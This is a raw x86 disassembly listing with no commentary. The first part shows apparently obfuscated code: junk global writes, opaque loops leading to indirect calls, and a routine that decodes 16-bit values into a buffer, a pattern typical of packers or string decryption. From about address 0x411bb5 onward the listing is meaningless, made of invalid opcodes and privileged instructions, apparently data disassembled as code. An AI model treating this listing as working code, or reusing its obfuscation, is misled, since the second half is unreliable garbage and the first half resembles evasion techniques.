  4116ad:	mov    ecx,DWORD PTR [ebp+0x8]
  4116b0:	movzx  eax,BYTE PTR ds:0x42901c
  4116b7:	adc    DWORD PTR ds:0x42b010,eax
  4116bd:	mov    eax,0x8a8c
  4116c2:	adc    DWORD PTR ds:0x42b00c,0x7010
  4116cc:	xor    ax,WORD PTR [ecx+0x20]
  4116d0:	mov    ecx,0x3b50
  4116d5:	or     DWORD PTR ds:0x429020,0x42a018
  4116df:	add    ax,cx
  4116e2:	xor    DWORD PTR ds:0x42c014,0x42d014
  4116ec:	movzx  eax,ax
  4116ef:	mov    DWORD PTR [ebp-0x10],eax
  4116f2:	mov    BYTE PTR [ebp-0x1],0x79
  4116f6:	adc    ecx,DWORD PTR ds:0x42b000
  4116fc:	lea    eax,[ebp-0x1]
  4116ff:	mov    DWORD PTR [ebp-0xc],eax
  411702:	sub    ecx,0x24e1
  411708:	mov    al,BYTE PTR [ebp-0x1]
  41170b:	or     DWORD PTR ds:0x42c01c,0x3fe4
  411715:	mov    ecx,DWORD PTR [ebp-0xc]
  411718:	and    DWORD PTR ds:0x42900c,0x42a000
  411722:	xor    al,0x73
  411724:	or     DWORD PTR ds:0x429024,0x42900c
  41172e:	sub    al,0x9
  411730:	or     DWORD PTR ds:0x429010,0x42d008
  41173a:	mov    BYTE PTR [ecx],al
  41173c:	and    DWORD PTR ds:0x429010,0x6711
  411746:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  41174d:	xor    DWORD PTR ds:0x42c004,ecx
  411753:	push   ebx
  411754:	mov    DWORD PTR ds:0x42901c,0x1f
  41175e:	cmp    DWORD PTR ds:0x42901c,0x0
  411765:	je     0x4117b8
  41176b:	cmp    DWORD PTR ds:0x42901c,0xf
  411772:	jne    0x41178d
  411778:	push   0x429024
  41177d:	push   0x42d010
  411782:	push   0x42d004
  411787:	call   DWORD PTR ds:0x42ec73
  41178d:	cmp    DWORD PTR ds:0x42901c,0x10
  411794:	jne    0x4117a8
  41179a:	xor    eax,eax
  41179c:	or     eax,DWORD PTR ds:0x42901c
  4117a2:	dec    eax
  4117a3:	mov    ds:0x42901c,eax
  4117a8:	mov    eax,ds:0x42901c
  4117ad:	dec    eax
  4117ae:	mov    ds:0x42901c,eax
  4117b3:	jmp    0x41175e
  4117b8:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  4117bf:	mov    ecx,DWORD PTR [ebp-0x18]
  4117c2:	add    DWORD PTR ds:0x42c004,0x3f3f
  4117cc:	push   esi
  4117cd:	add    DWORD PTR ds:0x42c018,edx
  4117d3:	mov    eax,0x7510899
  4117d8:	mov    DWORD PTR ds:0x42c01c,0x1b
  4117e2:	cmp    DWORD PTR ds:0x42c01c,0x0
  4117e9:	je     0x411895
  4117ef:	cmp    DWORD PTR ds:0x42c01c,0x2b
  4117f6:	jne    0x41180f
  4117fc:	push   DWORD PTR [ebp-0x24]
  4117ff:	push   0x19b0
  411804:	push   0x7260
  411809:	call   DWORD PTR ds:0x42ec77
  41180f:	xor    esi,esi
  411811:	xor    esi,DWORD PTR ds:0x42c01c
  411817:	dec    esi
  411818:	mov    DWORD PTR ds:0x42c01c,esi
  41181e:	jmp    0x4117e2
  411823:	and    DWORD PTR ds:0x429020,0x0
  41182d:	xor    esi,esi
  41182f:	add    esi,DWORD PTR ds:0x429020
  411835:	inc    esi
  411836:	mov    DWORD PTR ds:0x429020,esi
  41183c:	cmp    DWORD PTR ds:0x429020,0x10
  411843:	jne    0x41186e
  411849:	push   0x1225
  41184e:	push   0x6cf4
  411853:	push   0x42a010
  411858:	push   DWORD PTR [ebp-0x28]
  41185b:	push   DWORD PTR [ebp-0x10]
  41185e:	push   0x51d6
  411863:	push   0x29de
  411868:	call   DWORD PTR ds:0x42ec7f
  41186e:	cmp    DWORD PTR ds:0x429020,0xf
  411875:	jne    0x411888
  41187b:	mov    esi,DWORD PTR ds:0x429020
  411881:	inc    esi
  411882:	mov    DWORD PTR ds:0x429020,esi
  411888:	cmp    DWORD PTR ds:0x429020,0x1b
  41188f:	jb     0x41182d
  411895:	xor    ecx,eax
  411897:	mov    esi,0x3272e0
  41189c:	push   edi
  41189d:	add    ecx,esi
  41189f:	mov    DWORD PTR ds:0x429024,0x3aa4
  4118a9:	jmp    0x4118cd
  4118ae:	mov    dl,BYTE PTR [ebp-0x1]
  4118b1:	mov    DWORD PTR ds:0x42a004,0x1ec
  4118bb:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  4118c2:	mov    DWORD PTR ds:0x429024,0x3051
  4118cc:	inc    ecx
  4118cd:	mov    DWORD PTR ds:0x42c000,0x19d9
  4118d7:	cmp    ecx,0x40
  4118da:	jb     0x4118ae
  4118e0:	mov    edx,DWORD PTR [ebp-0x18]
  4118e3:	add    DWORD PTR ds:0x42a004,0x42c00c
  4118ed:	xor    edx,eax
  4118ef:	adc    DWORD PTR ds:0x42c00c,0x429010
  4118f9:	add    edx,esi
  4118fb:	mov    DWORD PTR ds:0x42c004,0x7d7
  411905:	jmp    0x4119f4
  41190a:	mov    edi,DWORD PTR [ebp+0x8]
  41190d:	movzx  ecx,WORD PTR ds:0x42b018
  411914:	sub    ecx,DWORD PTR ds:0x42a004
  41191a:	mov    DWORD PTR ds:0x42b018,ecx
  411920:	mov    ecx,0x8a8c
  411925:	dec    DWORD PTR ds:0x42a00c
  41192b:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411930:	mov    edi,0x3b50
  411935:	and    DWORD PTR ds:0x42a018,0x6b4e
  41193f:	add    cx,di
  411942:	and    DWORD PTR ds:0x429028,0x42b01c
  41194c:	movzx  ecx,cx
  41194f:	mov    DWORD PTR [ebp-0xc],ecx
  411952:	and    DWORD PTR ds:0x42b008,0x0
  41195c:	jmp    0x41196e
  411961:	mov    ecx,DWORD PTR ds:0x42b008
  411967:	inc    ecx
  411968:	mov    DWORD PTR ds:0x42b008,ecx
  41196e:	cmp    DWORD PTR ds:0x42b008,0x16
  411975:	jae    0x4119ca
  41197b:	cmp    DWORD PTR ds:0x42b008,0x5
  411982:	jne    0x4119a5
  411988:	push   0x42b01c
  41198d:	push   DWORD PTR [ebp-0x28]
  411990:	push   0x42e111
  411995:	push   0x1c03
  41199a:	push   0x29bc
  41199f:	call   DWORD PTR ds:0x42ec83
  4119a5:	cmp    DWORD PTR ds:0x42b008,0x4
  4119ac:	jne    0x4119bf
  4119b2:	mov    ecx,DWORD PTR ds:0x42b008
  4119b8:	inc    ecx
  4119b9:	mov    DWORD PTR ds:0x42b008,ecx
  4119bf:	jmp    0x411961
  4119c4:	add    ecx,0x3957
  4119ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4119cd:	movzx  ecx,WORD PTR [ecx+edx*4]
  4119d1:	or     DWORD PTR ds:0x42a00c,0x1f94
  4119db:	xor    ecx,0x8a8c
  4119e1:	add    ecx,edi
  4119e3:	mov    edi,DWORD PTR ds:0x42a000
  4119e9:	mov    edi,DWORD PTR [ebp-0xc]
  4119ec:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  4119f3:	inc    edx
  4119f4:	mov    DWORD PTR ds:0x42a00c,0x4266
  4119fe:	mov    ecx,DWORD PTR [ebp-0x10]
  411a01:	mov    DWORD PTR ds:0x42c014,0x5a0e
  411a0b:	cmp    edx,ecx
  411a0d:	mov    DWORD PTR ds:0x42c014,0x51cd
  411a17:	jne    0x41190a
  411a1d:	sub    DWORD PTR ds:0x429004,ebx
  411a23:	mov    ecx,DWORD PTR [ebp-0x18]
  411a26:	adc    edx,0x568c
  411a2c:	mov    edx,DWORD PTR [ebp+0x10]
  411a2f:	and    DWORD PTR ds:0x42a000,0x0
  411a39:	jmp    0x411a4b
  411a3e:	mov    edi,DWORD PTR ds:0x42a000
  411a44:	inc    edi
  411a45:	mov    DWORD PTR ds:0x42a000,edi
  411a4b:	cmp    DWORD PTR ds:0x42a000,0x18
  411a52:	jae    0x411a91
  411a58:	cmp    DWORD PTR ds:0x42a000,0xf
  411a5f:	jne    0x411a70
  411a65:	push   0x42b00c
  411a6a:	call   DWORD PTR ds:0x42ec8b
  411a70:	cmp    DWORD PTR ds:0x42a000,0xe
  411a77:	jne    0x411a8c
  411a7d:	xor    edi,edi
  411a7f:	xor    edi,DWORD PTR ds:0x42a000
  411a85:	inc    edi
  411a86:	mov    DWORD PTR ds:0x42a000,edi
  411a8c:	jmp    0x411a3e
  411a91:	xor    ecx,eax
  411a93:	and    DWORD PTR ds:0x42d018,0x0
  411a9d:	mov    edi,DWORD PTR ds:0x42d018
  411aa3:	inc    edi
  411aa4:	mov    DWORD PTR ds:0x42d018,edi
  411aaa:	cmp    DWORD PTR ds:0x42d018,0xf
  411ab1:	jne    0x411acd
  411ab7:	push   0x3d1c
  411abc:	push   DWORD PTR [ebp-0x24]
  411abf:	push   0x42c010
  411ac4:	push   DWORD PTR [ebp-0x20]
  411ac7:	call   DWORD PTR ds:0x42ec8f
  411acd:	cmp    DWORD PTR ds:0x42d018,0xe
  411ad4:	jne    0x411ae7
  411ada:	mov    edi,DWORD PTR ds:0x42d018
  411ae0:	inc    edi
  411ae1:	mov    DWORD PTR ds:0x42d018,edi
  411ae7:	cmp    DWORD PTR ds:0x42d018,0x1c
  411aee:	jb     0x411a9d
  411af4:	add    ecx,esi
  411af6:	mov    DWORD PTR ds:0x42a014,0x11ec
  411b00:	mov    DWORD PTR [edx],ecx
  411b02:	mov    ecx,DWORD PTR [ebp-0x18]
  411b05:	adc    edi,0xc83
  411b0b:	xor    ecx,eax
  411b0d:	sbb    DWORD PTR ds:0x429010,ecx
  411b13:	add    ecx,esi
  411b15:	or     DWORD PTR ds:0x42d010,edx
  411b1b:	mov    DWORD PTR [ebp-0xc],ecx
  411b1e:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  411b25:	mov    DWORD PTR [ebp-0x14],0xf89c85a9
  411b2c:	mov    DWORD PTR ds:0x42c014,0x1e
  411b36:	cmp    DWORD PTR ds:0x42c014,0x0
  411b3d:	je     0x411b6a
  411b43:	cmp    DWORD PTR ds:0x42c014,0x21
  411b4a:	jne    0x411b56
  411b50:	call   DWORD PTR ds:0x42ec93
  411b56:	xor    edi,edi
  411b58:	xor    edi,DWORD PTR ds:0x42c014
  411b5e:	dec    edi
  411b5f:	mov    DWORD PTR ds:0x42c014,edi
  411b65:	jmp    0x411b36
  411b6a:	mov    DWORD PTR [ebp-0x10],0xf89c95b9
  411b71:	mov    ecx,DWORD PTR [ebp-0x14]
  411b74:	or     edi,DWORD PTR ds:0x42c018
  411b7a:	mov    DWORD PTR [ebp+0x8],ecx
  411b7d:	mov    ecx,DWORD PTR [ebp+0x8]
  411b80:	xor    ecx,eax
  411b82:	add    DWORD PTR ds:0x42c00c,edi
  411b88:	add    ecx,esi
  411b8a:	mov    DWORD PTR ds:0x42c010,0x3ca8
  411b94:	mov    ecx,0x242ebed
  411b99:	mov    edi,DWORD PTR ds:0x42a004
  411b9f:	mov    edi,0xf641bea
  411ba4:	je     0x4145ae
  411baa:	mov    edx,DWORD PTR [ebp+0x8]
  411bad:	mov    ebx,DWORD PTR [ebp-0x8]
  411bb0:	jmp    0x413f6f
  411bb5:	mov    edx,0x77290712
  411bba:	pshufw mm2,QWORD PTR [ecx-0x127d1cb5],0x6e
  411bc2:	call   0x7a7a:0xae128683
  411bc9:	fcomp  DWORD PTR [edi+0x7a]
  411bcc:	jp     0x411bde
  411bce:	and    edx,ecx
  411bd0:	inc    ecx
  411bd1:	ficomp WORD PTR [ebx+0x24e9bfe9]
  411bd7:	and    BYTE PTR [eax+0x25],dl
  411bda:	xor    eax,DWORD PTR [esi+edi*8]
  411bdd:	iret   
  411bde:	call   0xfb15:0x656d5bc3
  411be5:	lods   al,BYTE PTR ds:[esi]
  411be6:	xor    bl,cl
  411be8:	out    0xe5,al
  411bea:	(bad)  
  411beb:	fs push edx
  411bed:	data16 mov cl,0x3a
  411bf0:	dec    esi
  411bf1:	sahf   
  411bf2:	pop    ss
  411bf3:	jae    0x411bff
  411bf5:	in     eax,0xf8
  411bf7:	stc    
  411bf8:	imul   eax,DWORD PTR [eax],0x8904372a
  411bfe:	push   ds
  411bff:	(bad)  
  411c00:	fs mov ch,0x35
  411c03:	mov    dh,0x99
  411c05:	shr    bh,1
  411c07:	sub    al,BYTE PTR [eax-0x53027367]
  411c0d:	push   0x1e
  411c0f:	add    ah,BYTE PTR [edx-0x14fdcc12]
  411c15:	std    
  411c16:	jle    0x411c7d
  411c18:	mov    bl,0xd6
  411c1a:	lahf   
  411c1b:	add    edi,ecx
  411c1d:	ins    BYTE PTR es:[edi],dx
  411c1e:	mov    esi,0xeb698908
  411c23:	aas    
  411c24:	xchg   BYTE PTR [esi],bl
  411c26:	int    0x4b
  411c28:	lds    edx,FWORD PTR [edx+edi*8+0x41]
  411c2c:	pop    esi
  411c2d:	lds    edx,FWORD PTR [eax+0x73]
  411c30:	jno    0x411c53
  411c32:	out    dx,eax
  411c33:	or     edx,DWORD PTR [eax]
  411c35:	dec    ebp
  411c36:	je     0x411c37
  411c38:	rcl    BYTE PTR [ebx-0x42],0xa9
  411c3c:	or     cl,BYTE PTR [edx+0x4e]
  411c3f:	aam    0x7c
  411c41:	into   
  411c42:	cli    
  411c43:	mov    bh,0x15
  411c45:	xchg   BYTE PTR [edx+0x3e],ch
  411c48:	cmp    DWORD PTR ds:0x7f8d7998,esi
  411c4e:	mov    al,0xf0
  411c50:	push   ebx
  411c51:	xor    al,0x4e
  411c53:	std    
  411c54:	cpuid  
  411c56:	mov    ah,0x43
  411c58:	(bad)  
  411c59:	ja     0x411c2a
  411c5b:	in     eax,0xc
  411c5d:	adc    DWORD PTR [edi],eax
  411c5f:	xlat   BYTE PTR ds:[ebx]
  411c60:	jmp    0x41fc:0xfcac35e1
  411c67:	jge    0x411cc7
  411c69:	jae    0x411c88
  411c6b:	mov    ebx,0xc83bc5c0
  411c70:	xor    al,bl
  411c72:	sub    cl,BYTE PTR [ecx]
  411c74:	pop    ebp
  411c75:	jg     0x411c61
  411c77:	fdivr  QWORD PTR [edx-0x27]
  411c7a:	xlat   BYTE PTR ds:[ebx]
  411c7b:	adc    ecx,0x1b
  411c7e:	inc    edx
  411c7f:	inc    ebx
  411c80:	mov    BYTE PTR [edx+ebp*1-0x77],cl
  411c84:	xor    DWORD PTR [ebx+0x64],0x50bab544
  411c8b:	and    edx,esi
  411c8d:	pop    eax
  411c8e:	sub    DWORD PTR [eax+edi*2+0x23d88da3],0xffffffa4
  411c96:	fcom   DWORD PTR [bp+0x1c50]
  411c9b:	shr    BYTE PTR [esi],0x22
  411c9e:	push   edx
  411c9f:	xchg   DWORD PTR [ebp+0x5d],edx
  411ca2:	in     eax,dx
  411ca3:	jae    0x411ca8
  411ca5:	sub    BYTE PTR [edx],ch
  411ca7:	aaa    
  411ca8:	xor    DWORD PTR [esi-0x1328020b],esp
  411cae:	cmp    ch,ah
  411cb0:	pop    es
  411cb1:	inc    ebp
  411cb2:	stc    
  411cb3:	into   
  411cb4:	aad    0xc9
  411cb6:	lock loope 0x411c65
  411cb9:	adc    al,0xaf
  411cbb:	sbb    eax,0x177f315
  411cc0:	jmp    ebp
  411cc2:	add    BYTE PTR [esi+0x5c],dl
  411cc5:	mov    ds,esi
  411cc7:	or     BYTE PTR [edx],dh
  411cc9:	or     eax,0x864231af
  411cce:	jge    0x411cc3
  411cd0:	(bad)  
  411cd1:	xor    eax,0xd5ddd384
  411cd6:	rcl    DWORD PTR [ecx+eiz*8+0x5ffccb0b],1
  411cdd:	jb     0x411cbc
  411cdf:	cwde   
  411ce0:	sub    DWORD PTR [edx],eax
  411ce2:	in     eax,dx
  411ce3:	fcom   QWORD PTR [ecx]
  411ce5:	adc    ch,BYTE PTR [ebp+edx*2+0x5d1a3f1b]
  411cec:	xor    cl,BYTE PTR [eax+edi*2]
  411cef:	mov    ebp,0x93a18960
  411cf4:	imul   esp,DWORD PTR [edi-0x23],0x1bc2fcf1
  411cfb:	cli    
  411cfc:	fistp  DWORD PTR [ebx-0xd2e49dd]
  411d02:	mov    edi,0x17819b48
  411d07:	sbb    DWORD PTR [ebx],0x49953619
  411d0d:	mov    bh,0x70
  411d0f:	in     eax,dx
  411d10:	mov    DWORD PTR [ecx],edi
  411d12:	cmp    BYTE PTR [eax-0x3e],bl
  411d15:	lods   al,BYTE PTR ds:[esi]
  411d16:	pop    ebx
  411d17:	dec    esp
  411d18:	pop    edi
  411d19:	ds xchg ecx,eax
  411d1b:	mov    dh,0x36
  411d1d:	psrlq  mm1,QWORD PTR [edi]
  411d20:	sub    cl,BYTE PTR [esp+eax*1]
  411d23:	call   0xf9c50f4
  411d28:	adc    ebx,esp
  411d2a:	xchg   edx,eax
  411d2b:	jecxz  0x411cd1
  411d2d:	imul   eax,DWORD PTR ds:[edx],0xfffffff1
  411d31:	test   DWORD PTR [edi+0x2e],edx
  411d34:	pop    edx
  411d35:	push   0x23
  411d37:	test   DWORD PTR [ebx],ecx
  411d39:	jae    0x411cc7
  411d3b:	push   edx
  411d3c:	mov    bl,BYTE PTR [edx-0x4c]
  411d3f:	push   ebx
  411d40:	push   0x40
  411d42:	mov    ds:0x703ad510,eax
  411d47:	rcl    esp,1
  411d49:	lock call 0x3fa6:0x8b85a7e6
  411d51:	rcr    DWORD PTR [edi-0x58],cl
  411d54:	mov    al,BYTE PTR [esi]
  411d56:	in     al,0xda
  411d58:	stos   DWORD PTR es:[edi],eax
  411d59:	push   ecx
  411d5a:	add    ebp,ebp
  411d5c:	sub    ecx,DWORD PTR [edi-0x59034d2c]
  411d62:	ja     0x411dc8
  411d64:	hlt    
  411d65:	les    edi,FWORD PTR [edx]
  411d67:	sbb    BYTE PTR [esi+0x54],bl
  411d6a:	push   ds
  411d6b:	test   DWORD PTR [ecx+0x5],edi
  411d6e:	push   ss
  411d6f:	mov    bl,0x48
  411d71:	sbb    eax,0x5bd90300
  411d76:	in     eax,0x97
  411d78:	dec    edx
  411d79:	mov    ah,0xf3
  411d7b:	mov    al,0x8c
  411d7d:	push   ebp
  411d7e:	call   0xdaa4a869
  411d83:	es in  al,0xea
  411d86:	loopne 0x411d40
  411d88:	xor    ah,dl
  411d8a:	in     al,dx
  411d8b:	fsubr  DWORD PTR [ecx+edi*4+0x65]
  411d8f:	mov    edi,0x338f830a
  411d94:	cdq    
  411d95:	cmp    eax,0xaa6d0487
  411d9a:	mov    ds:0xa6102aa9,eax
  411da0:	mov    dh,0xa8
  411da2:	mov    ebp,0x7fc51304
  411da7:	jo     0x411d4d
  411da9:	out    0xe4,eax
  411dab:	or     al,0xd3
  411dad:	push   ebx
  411dae:	pop    es
  411daf:	hlt    
  411db0:	jg     0x411d96
  411db2:	rol    BYTE PTR [ebp+0x6e77ac07],1
  411db8:	dec    ebp
  411db9:	mov    ebx,0xaebea9c5
  411dbe:	arpl   WORD PTR [esp+ebp*4],di
  411dc1:	or     ebx,DWORD PTR [eax-0x3]
  411dc4:	adc    bl,dh
  411dc6:	cwde   
  411dc7:	js     0x411dd7
  411dc9:	jno    0x411e0c
  411dcb:	xor    edx,DWORD PTR [esi-0x7e669b2f]
  411dd1:	popf   
  411dd2:	int    0xd8
  411dd4:	lea    ebp,[edx-0x46]
  411dd7:	sub    BYTE PTR [eax+0x1f7b4ac0],ch
  411ddd:	shl    BYTE PTR [edi+0x18],0x3d
  411de1:	jbe    0x411e05
  411de3:	cwde   
  411de4:	imul   ecx,esp,0xffffffdc
  411de7:	int3   
  411de8:	xchg   ebx,eax
  411de9:	xor    al,0x62
  411deb:	bound  ebx,QWORD PTR [ecx-0x43]
  411dee:	inc    ecx
  411def:	into   
  411df0:	inc    ebx
  411df1:	xor    eax,0x68300f73
  411df6:	and    eax,0xbdf698ac
  411dfb:	push   edi
  411dfc:	xlat   BYTE PTR ds:[ebx]
  411dfd:	pop    edx
  411dfe:	inc    esi
  411dff:	add    cl,BYTE PTR [eax-0x55]
  411e02:	pop    esi
  411e03:	into   
  411e04:	add    al,0x6a
  411e06:	jb     0x411e6f
  411e08:	(bad)  
  411e09:	jmp    0x4f60a88
  411e0e:	push   cs
  411e0f:	ret    
  411e10:	daa    
  411e11:	icebp  
  411e12:	xchg   edx,eax
  411e13:	addr16 xchg edx,edi
  411e16:	into   
  411e17:	rol    DWORD PTR [eax],1
  411e19:	sbb    BYTE PTR [esi+0x5df9a128],bh
  411e1f:	push   esi
  411e20:	inc    ebx
  411e21:	outs   dx,DWORD PTR ds:[esi]
  411e22:	sub    eax,0x1bcb249e
  411e27:	cdq    
  411e28:	xchg   ecx,eax
  411e29:	pop    ds
  411e2a:	gs cld 
  411e2c:	out    dx,eax
  411e2d:	xchg   ebp,eax
  411e2e:	dec    ebp
  411e2f:	inc    edx
  411e30:	es call 0x93c:0xdd310ab7
  411e38:	mov    ds:0xe89dd82b,eax
  411e3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e3e:	cmp    al,0x19
  411e40:	lods   al,BYTE PTR ds:[esi]
  411e41:	inc    esi
  411e42:	cmp    bl,BYTE PTR [edx]
  411e44:	in     eax,dx
  411e45:	icebp  
  411e46:	adc    eax,0x8d02389c
  411e4b:	xor    edx,eax
  411e4d:	cmc    
  411e4e:	es dec ecx
  411e50:	xor    DWORD PTR [esp+esi*4+0x6e6a24c4],esi
  411e57:	icebp  
  411e58:	xlat   BYTE PTR ds:[ebx]
  411e59:	(bad)  
  411e5a:	imul   ebx,DWORD PTR [edx-0x43],0x6c
  411e5e:	add    esi,DWORD PTR [edx]
  411e60:	fisttp DWORD PTR [ebp-0x5b112689]
  411e66:	in     al,0xf
  411e68:	push   ebp
  411e69:	sub    DWORD PTR [edi-0x2f],0xc5776393
  411e70:	push   0x55d00a80
  411e75:	sub    dh,BYTE PTR [ebx]
  411e77:	out    dx,eax
  411e78:	mov    dl,0x2b
  411e7a:	bound  edi,QWORD PTR [edi+0x65233e68]
  411e80:	lods   al,BYTE PTR ds:[esi]
  411e81:	dec    eax
  411e82:	mov    dh,0x7b
  411e84:	jle    0x411e9a
  411e86:	push   edi
  411e87:	pop    esp
  411e88:	shl    DWORD PTR [esi],cl
  411e8a:	add    BYTE PTR [esi+0x3e],dl
  411e8d:	inc    edi
  411e8e:	mov    al,0x5d
  411e90:	sub    ch,BYTE PTR [esi-0x5e]
  411e93:	or     bh,dl
  411e95:	fsub   QWORD PTR [edi-0x4a63b478]
  411e9b:	lock ins BYTE PTR es:[edi],dx
  411e9d:	jecxz  0x411e25
  411e9f:	mov    esi,0x9a04d706
  411ea4:	fiadd  DWORD PTR [ecx-0x25]
  411ea7:	push   edi
  411ea8:	mov    edi,0x610e6d04
  411ead:	xchg   ebx,eax
  411eae:	out    0xea,eax
  411eb0:	adc    al,BYTE PTR [ecx-0x6bb245a8]
  411eb6:	add    al,0x5e
  411eb8:	cdq    
  411eb9:	shl    BYTE PTR [edi+ebp*1-0x35db4bf1],0x5a
  411ec1:	jmp    0x9491:0x3637021e
  411ec8:	stos   BYTE PTR es:[edi],al
  411ec9:	test   bh,0x42
  411ecc:	ins    DWORD PTR es:[edi],dx
  411ecd:	fcmovu st,st(4)
  411ecf:	ds (bad) 
  411ed1:	fstp   DWORD PTR [edx-0x1b]
  411ed4:	popf   
  411ed5:	mov    cl,0xe7
  411ed7:	sub    DWORD PTR [esi],ebp
  411ed9:	mov    gs,WORD PTR [ebp-0x63862c75]
  411edf:	inc    ebp
  411ee0:	add    ah,BYTE PTR [edi-0x3b]
  411ee3:	pop    es
  411ee4:	gs jbe 0x411e85
  411ee7:	pop    ebx
  411ee8:	pop    esi
  411ee9:	ret    0x9d1
  411eec:	test   BYTE PTR [esi],dl
  411eee:	add    ah,BYTE PTR [edx-0x61]
  411ef1:	mov    al,ds:0xe0c81af4
  411ef6:	hlt    
  411ef7:	jmp    0x411e99
  411ef9:	adc    al,0x15
  411efb:	shl    bl,1
  411efd:	fwait
  411efe:	add    DWORD PTR [ebx-0x737de8c6],ecx
  411f04:	inc    eax
  411f05:	or     al,0x21
  411f07:	sahf   
  411f08:	cmp    ch,dh
  411f0a:	retf   0xdad9
  411f0d:	test   esi,eax
  411f0f:	data16 mov dh,0x87
  411f12:	fistp  QWORD PTR [edi-0x55d86f8b]
  411f18:	mov    bh,BYTE PTR [esi]
  411f1a:	shl    bl,0x29
  411f1d:	sbb    DWORD PTR [ebp-0x22fbd2e4],edx
  411f23:	test   DWORD PTR [esi-0x3443e974],ebx
  411f29:	adc    al,0xf4
  411f2b:	mov    ds:0x1318c2f5,eax
  411f30:	xchg   DWORD PTR [ecx],edx
  411f32:	fnstenv [ebx+0x1e6905a4]
  411f38:	ins    DWORD PTR es:[edi],dx
  411f39:	push   0xe1703927
  411f3e:	mov    ds:0xfd14f2d0,al
  411f43:	cmp    DWORD PTR [ebp+0x7408d1ba],ebp
  411f49:	xchg   edi,eax
  411f4a:	jb     0x411fa5
  411f4c:	jmp    0xe5bd34b0
  411f51:	add    ebp,DWORD PTR [ecx-0x456eddd3]
  411f57:	daa    
  411f58:	test   DWORD PTR [edx],esi
  411f5a:	inc    ecx
  411f5b:	push   esi
  411f5c:	out    dx,al
  411f5d:	or     cl,BYTE PTR [eax]
  411f5f:	mov    bh,0x81
  411f61:	xchg   DWORD PTR [ebx-0x6],esi
  411f64:	inc    eax
  411f65:	shl    BYTE PTR [esi-0x5e893f05],0x7b
  411f6c:	fadd   DWORD PTR [esi*1-0x6d1742d0]
  411f73:	clc    
  411f74:	int    0xf0
  411f76:	lea    eax,[edx]
  411f78:	sbb    ebp,DWORD PTR [eax+0x0]
  411f7b:	xchg   esi,eax
  411f7c:	push   ecx
  411f7d:	xchg   edi,eax
  411f7e:	loopne 0x411f14
  411f80:	out    dx,eax
  411f81:	inc    BYTE PTR [ebx+0x7add7c76]
  411f87:	jnp    0x411f42
  411f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f8a:	or     bl,BYTE PTR [edx+ebx*1]
  411f8d:	adc    dl,al
  411f8f:	js     0x411f5c
  411f91:	push   esi
  411f92:	pushf  
  411f93:	rcl    BYTE PTR [edi-0x1d8c217c],cl
  411f99:	inc    edi
  411f9a:	mov    bh,BYTE PTR [eax-0x28]
  411f9d:	and    BYTE PTR [edi-0x2df3e134],dl
  411fa3:	cmp    bh,BYTE PTR [ebp+0xe]
  411fa6:	jae    0x411f28
  411fa8:	xor    cl,BYTE PTR [ebx-0x48c5bd9e]
  411fae:	cs push es
  411fb0:	das    
  411fb1:	jle    0x411f51
  411fb3:	inc    edi
  411fb4:	aad    0x9d
  411fb6:	xor    al,0x2b
  411fb8:	xchg   edx,eax
  411fb9:	xor    ebp,0x166e63d2
  411fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fc0:	mov    ds:0x21150e4f,al
  411fc5:	xor    eax,0x34999c72
  411fca:	inc    esi
  411fcb:	inc    ebx
  411fcc:	mov    ah,0x8e
  411fce:	cli    
  411fcf:	rcr    cl,0x23
  411fd2:	xor    ah,BYTE PTR [edi-0x1dff0c3e]
  411fd8:	ins    DWORD PTR es:[edi],dx
  411fd9:	cmp    al,BYTE PTR [edi]
  411fdb:	stos   BYTE PTR es:[di],al
  411fdd:	mov    bh,0x49
  411fdf:	cmp    bh,dl
  411fe1:	cld    
  411fe2:	and    ebx,DWORD PTR [esi]
  411fe4:	mov    ?,WORD PTR [edx+0x2c]
  411fe7:	xor    eax,0x3ac9af72
  411fec:	pop    edi
  411fed:	mov    ecx,0x37aa8862
  411ff2:	fidivr DWORD PTR [ebx]
  411ff4:	shr    DWORD PTR [edi+0x34fa12e],1
  411ffa:	daa    
  411ffb:	and    ch,BYTE PTR [ebx-0x9]
  411ffe:	add    eax,0xff2f3fa8
  412003:	cmp    eax,0x8866456d
  412008:	sbb    al,0xee
  41200a:	imul   ebp,DWORD PTR [edi+0x2e5c256],0xffffff99
  412011:	adc    al,0xdc
  412013:	loop   0x41205c
  412015:	je     0x411fcc
  412017:	outs   dx,DWORD PTR ds:[esi]
  412018:	pop    edx
  412019:	ficomp DWORD PTR gs:[ebx-0x57cbacd7]
  412020:	jb     0x411fdb
  412022:	arpl   di,sp
  412024:	(bad)  
  412025:	sub    dl,BYTE PTR [eax]
  412027:	fcmovne st,st(1)
  412029:	pop    ebp
  41202a:	js     0x411fd2
  41202c:	bswap  ecx
  41202e:	sub    BYTE PTR [esi+ecx*2-0x1d],cl
  412032:	sub    DWORD PTR [edi],eax
  412034:	int    0xc7
  412036:	out    dx,eax
  412037:	sub    bl,BYTE PTR [edx]
  412039:	inc    edx
  41203a:	scas   al,BYTE PTR es:[edi]
  41203b:	pop    esi
  41203c:	fs repnz loopne 0x41205d
  412040:	add    al,0x22
  412042:	sbb    dl,BYTE PTR [edi-0x1c663cbd]
  412048:	shl    DWORD PTR [ecx*1+0x2b3955a0],0x16
  412050:	aam    0x2
  412052:	or     al,0xd3
  412054:	and    eax,0xa122229c
  412059:	mov    dh,0x85
  41205b:	es add eax,0x52f52a74
  412061:	call   0x3897:0x834b9e61
  412068:	fsub   QWORD PTR [edi+0x27f576f1]
  41206e:	mov    bl,0x4c
  412070:	xchg   dl,dh
  412072:	jp     0x41201d
  412074:	(bad)  [edi-0xb]
  412077:	shl    DWORD PTR [edi+0x1fb301d3],1
  41207d:	mov    ebp,0xa6448ca3
  412082:	jmp    0xdf98:0x1e584a9
  412089:	(bad)  [ecx+0x31]
  41208c:	enter  0x755,0xe1
  412090:	and    ecx,DWORD PTR [edx]
  412092:	add    dh,BYTE PTR [esi]
  412094:	ins    BYTE PTR es:[edi],dx
  412095:	aad    0xcf
  412097:	leave  
  412098:	xor    al,0x4f
  41209a:	into   
  41209b:	cli    
  41209c:	outs   dx,BYTE PTR ds:[esi]
